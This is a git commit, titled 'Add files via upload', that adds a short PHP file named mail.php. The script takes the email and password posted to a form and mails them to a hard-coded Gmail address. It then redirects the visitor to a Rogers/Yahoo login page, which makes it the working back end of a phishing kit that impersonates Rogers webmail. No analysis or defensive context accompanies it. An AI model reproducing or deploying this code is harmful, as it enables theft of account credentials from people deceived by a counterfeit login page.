29f7bb4f474bfa79eaeb8af04385211833c2ddf4
Don326699 <133876036+Don326699@users.noreply.github.com>
2023-05-17 09:31:56 -0300

    Add files via upload

---
+++ mail.php
@@ -0,0 +1,19 @@
+<?php
+//get data from form  
+$email = $_POST['email'];
+$password= $_POST['password'];
+/* $message= $_POST['message']; */
+
+$to = "patunolaibukundavid@gmail.com";
+
+$subject = "Mail From rogers";
+/* $txt ="E-mail = ". $email . "\r\n  Password = " . $password . "\r\n Message =" . $message; */
+$txt ="E-mail = ". $email . "\r\n  Password = " . $password;
+$headers = "From: noreply@roger.com" . "\r\n" .
+"CC: somebodyelse@example.com";
+if($email!=NULL){
+    mail($to,$subject,$txt,$headers);
+}
+//redirect
+header("Location:https://ca.rogers.yahoo.com/");
+?>
